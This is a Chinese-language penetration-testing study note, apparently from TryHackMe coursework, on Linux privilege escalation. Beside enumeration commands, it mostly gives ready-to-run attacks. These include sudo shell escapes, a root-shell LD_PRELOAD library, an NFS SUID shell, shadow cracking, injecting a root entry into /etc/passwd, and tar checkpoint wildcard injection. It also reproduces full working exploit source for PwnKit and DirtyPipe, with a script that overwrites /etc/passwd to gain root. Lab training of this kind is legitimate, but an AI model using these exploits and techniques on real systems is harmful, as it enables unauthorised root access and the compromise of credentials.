---
title: Linux_Privilege_Escalation
date: 2024-05-29 13:44:32
updated: 2026-04-13 14:03:42
tags:
  - 打靶
  - TryHackMe
  - Jr_Penetration_Tester
  - Shells_and_Privilege_Escalation
---
[Linux提权基础分享和讨论 - 先知社区](https://xz.aliyun.com/t/11664?time__1311=mqmx0DBDuDcD2QD9DBuQ1GkQrPxMR8DArD#toc-6)

参考袁神笔记@Kaguya

# 自检表(优先级从上至下)

-   是否查看sudo -l?
-   是否通过ls /home和cat /etc/passwd收集用户名信息?
-   是否使用find查找SUID文件信息?

-   验证是否存在Pwnkit

-   是否使用getcap查看特殊能力文件?
-   是否通过cat /etc/crontab查看计划任务表?

-   如果有，是否存在可修改的计划任务？

-   是否可以下载其他用户的SSH私钥/home/<用户名>/.ssh/id\_rsa?
-   是否有特别的二进制文件(例如具有SUID的文件)疑似执行了系统命令?

-   如果有，是否尝试劫持环境变量?

-   是否使用lse搜索可利用信息?
-   是否查看系统存在NFS、SMB、FTP等文件共享功能?

-   如果有，是否允许匿名访问？以及是否有不合理的配置？

-   是否查看环境变量、系统版本、内核版本?

-   如果有，是否查询了CVE？
-   验证是否存在DirtyPipe

# 信息收集

[linpeas.sh](https://www.yuque.com/attachments/yuque/0/2025/sh/39170111/1739106965267-0dbd582e-7c30-4276-9522-4913da3c3aef.sh)

```shell
hostname							主机名
uname -a							内核信息
cat /proc/version			内核版本和其他信息(如编译器GCC)
cat /etc/issue				系统版本
    /etc/os-release
cat /etc/profile   		显示默认系统变量

ps										查看 Linux 系统上正在运行的进程
top
ps -A									查看所有正在运行的进程
ps axjf								查看进程树
ps aux								显示所有用户和未连接到终端的进程

env										显示环境变量(PATH变量等)
sudo -l								列出用户可以使用的所有 sudo 命令
ls -alt								
ls -a
id [user]							供用户权限级别和组成员身份的一般概述

cat /etc/passwd				用户列表 (uid > 1000) 用户名:x:uid:gid:gecos:主目录:shell路径
cat /etc/passwd | cut -d ":" -f 1
cat /etc/passwd | grep home
cat /etc/lsb-release # Debian 
cat /etc/redhat-release # Redhat

  history
ifconfig							提供有关系统网络接口的信息
ip route							网络路由

netstat -a						显示所有侦听端口和已建立的连接
netstat -at/-au 			列出TCP或UDP协议
netstat -l/-ltp				列出处于“侦听”模式的端口,(服务名称和 PID 信息)
netstat -s						按协议列出网络使用情况统计信息(-st/-su)
netstat -i						显示接口统计信息
netstat -ano					不解析名称,显示定时器

find . -name 1.txt		在当前目录下找到名为“1.txt”的文件
find / -type d -name config		在“/”下找到名为config的目录
find / -type f -perm 0777			查找具有 777 权限的文件（所有用户可读、可写和可执行的文件）
find / -perm a=x							查找可执行文件
find /home -user frank				在“/home”下查找用户“Frank”的所有文件

find / -mtime 10							查找过去 10 天内修改过的文件
find / -atime 10							查找过去 10 天内访问过的文件
find / -cmin -60							查找过去 60 分钟内更改的文件
find / -amin -60							查找过去 60 分钟内访问的文件
find / -size 50M							查找大小为 50 MB 的文件
find / -size (+/-)50M -type f 2>/dev/null		大于/小于50MB

find / -writable -type d 2>/dev/null 		查找全局可写文件夹
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

find / -perm -o x -type d 2>/dev/null		查找全局可执行文件夹

find / -name perl*			查找开发工具和支持的语言
find / -name python*
find / -name gcc*

find / -perm -u=s -type f 2>/dev/null		查找具有 SUID 位的文件
find / -type f -perm -04000 -ls 2>/dev/null
```

# 自动枚举工具

-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)​
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)​
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)​
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)​
-   **Linux Priv Checker:**[https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
-   python:SimpleHTTPServer

`python -m http.server 3333`

`wget`

# 内核漏洞利用

```shell
1. 识别内核版本
2. 搜索并找到目标系统内核版本的漏洞利用代码
  https://www.linuxkernelcves.com/cves
3. 运行漏洞利用代码--执行相关exp
```

# sudo -l

```shell
#sudo -l 查看有 sudo 权限的程序
配合https://gtfobins.github.io利用

##nmap
sudo nmap --interactive
!sh
!bash
还可以
echo" os.execute（'/bin/sh'）"> /tmp/shell.nse && sudo nmap --script = /tmp/shell.nse

##less
sudo less /etc/profile
!/bin/sh

##find
sudo find . -exec /bin/sh \; -quit

##nano
sudo nano
连续键入ctrl+r和ctrl+x两个组合键
输入命令reset; sh 1>&0 2>&0提权至root
sudo nano -s /bin/sh
bin/sh，再键入ctrl+t
```

## **利用应用程序功能**

**Apache2** 有一个选项支持加载备用配置文件（ `-f`：指定备用 ServerConfigFile）。

使用此选项加载 `/etc/shadow` 文件将导致包含 `/etc/shadow` 文件第一行

## **LD\_PRELOAD**

```shell
1 检查 LD_PRELOAD（通过输入命令sudo -l查看：LD_PRELOAD是否使用了 env_keep 选项）；

2 编写能够被编译为共享对象（.so 扩展名）文件的简单 C 代码；
  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
  启动任何用户可以使用 sudo 运行的程序来使用此共享对象文件:
  sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
  
3 使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序。
```
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

LD\_PRELOAD 是一个允许任何程序使用共享库的函数。

[Dynamic linker tricks: Using LD_PRELOAD to cheat, inject features and investigate programs](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)

如果启用了“env\_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载和执行。请注意，如果真实用户 ID 与有效用户 ID 不同，则LD\_PRELOAD选项将被忽略。

![gGstS69.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717178371344-6abd5b76-d762-4940-b3f9-8efb1dd19e85.png)

# 寻找suid权限文件

```shell
find / -type f -perm -04000 -ls 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
#将列出设置了 SUID 或 SGID 位的文件。-02000，则是查找设置了SGID位的文件
与https://gtfobins.github.io/对比

##base64 读取文件
LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
```

# 寻找有Capabilities的文件

```shell
getcap -r / 2>/dev/null	# 列出已经启用的Capabilities
# cap_setuid和cap_setgid权限的程序
配合https://gtfobins.github.io/利用
```

# 查看Cron表

```shell
# 计划任务 会按照文件中规定的方式以xx身份执行xx文件
cat /etc/crontab
## 未定义脚本的完整路径，cron 将引用 /etc/crontab 文件中 PATH 变量下列出的路径。

# 一般格式如下:
时机 身份 执行的内容

若 cron作业存在 且 对应的的脚本被删除或可修改
则 可以修改或创建对应的 以 root 权限运行 的脚本来执行特权命令
```

# 寻找id\_rsa

```shell
# 该文件是SSH的私钥，有时可以在下列路径找到
# /home/xxxx/.ssh/id_rsa
# /root/.ssh/id_rsa

# 获取到目标用户的密钥后，使用ssh连接
sudo ssh xxxx@ip -i id_rsa
```

# 爆破用户名密码

```shell
#	读取/etc/shadow
nano /etc/shadow
# 破解用户名密码
unshadow passwd.txt shadow.txt > passwords.txt

john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
```

# 添加用户名密码

```shell
# 生成用户拥有的密码的哈希值
openssl passwd -1 -salt THM password1
# 将此密码与用户名添加到 /etc/passwd 文件中
$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
```

# 劫持环境变量$PATH

```shell
# 1. 哪些文件夹位于$PATH下
echo $PATH

# 2. 当前用户是否对这些文件夹有写入权限？
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# 3. 你能修改$PATH吗？
export PATH=/tmp:$PATH

# 4. 是否拥有root权限或suid的应用来对其他应用的进行调用
## echo "/bin/bash" > thm
## chmod 777 thm
```

# 通过NFS提权

```shell
cat /etc/exports # 查看NFS配置文件
# 观察是否有no_root_squash选项的目录

showmount -e ip # 枚举目标可挂载共享目录

mount -o rw ip:/remotedir /localdir # 将目标的可挂载共享目录/remotedir挂载到/localdir/下

# 在目标目录下创建文件并赋予suid
x86_64-linux-gnu-gcc -static -o shell shell.c
chmod +s shell #在root下赋予suid
ls -l #查看文件权限
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (void)
{
setuid(0);
setgid(0);
system("/bin/bash");
return 0;
}
```

# CVE-2021-4034 Pwnkit

```shell
# 特征:
find / -type f -perm -04000 -ls 2>/dev/null
# 有以下结果:
/usr/lib/polkit-1/polkit-agent-helper-1
```

删除.txt后缀 上传到目标靶机运行即可

[CVE-2021-4034.txt](https://www.yuque.com/attachments/yuque/0/2024/txt/39170111/1717647252045-5b778df5-7f68-473b-bca4-c481e0165737.txt)

源码：

```c
/*
 * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
 * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

编译方法：

```shell
gcc CVE-2021-4034.c -o CVE-2021-4034
chmod +x ./CVE-2021-4034
./CVE-2021-4034
```

# CVE-2022-0847 DirtyPipe

```shell
# 利用条件:
5.8 <= Linux内核版本 < 5.16.11/5.15.25/5.10.102
```

源码：

```shell
#/bin/bash
cat>exp.c<<EOF
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int main(int argc, char **argv)
{
	if (argc != 4) {
		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
		return EXIT_FAILURE;
	}

	/* dumb command-line argument parser */
	const char *const path = argv[1];
	loff_t offset = strtoul(argv[2], NULL, 0);
	const char *const data = argv[3];
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	printf("It worked!\n");
	return EXIT_SUCCESS;
}
EOF

gcc exp.c -o exp -std=c99

# 备份密码文件
rm -f /tmp/passwd
cp /etc/passwd /tmp/passwd
if [ -f "/tmp/passwd" ];then
	echo "/etc/passwd已备份到/tmp/passwd"
	passwd_tmp=$(cat /etc/passwd|head)
	./exp /etc/passwd 1 "${passwd_tmp/root:x/oot:}"

	echo -e "\n# 恢复原来的密码\nrm -rf /etc/passwd\nmv /tmp/passwd /etc/passwd"

	# 现在可以无需密码切换到root账号
	su root
else
	echo "/etc/passwd未备份到/tmp/passwd"
	exit 1
fi

```

使用方法：

```shell
chmod +x ./DirtyPipe.sh
./DirtyPipe.sh
```

# tar命令提权

```shell
# 当可以通过sudo或suid执行tar命令时
echo "/bin/bash" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```

> tar命令有两个参数 --checkpoint --checkpoint-action
> 
> –checkpoint[=NUMBER] 显示每个Numbers记录的进度消息（默认值为10）
> 
> –checkpoint-action=ACTION 在每个checkpoint（检查点）上执行ACTION
> 
> 这里的‘–checkpoint-action’选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项‘–checkpoint=1’ 和 ‘–checkpoint-action=exec=sh shell.sh’作为命令行选项交给了tar程序。
> 
> 当执行tar 命令时，通配符\* 会自动被替换成参数，完整的命令就成下面  
> tar cf archive.tar \* --checkpoint=1 --checkpoint-action=exec=sh shell.sh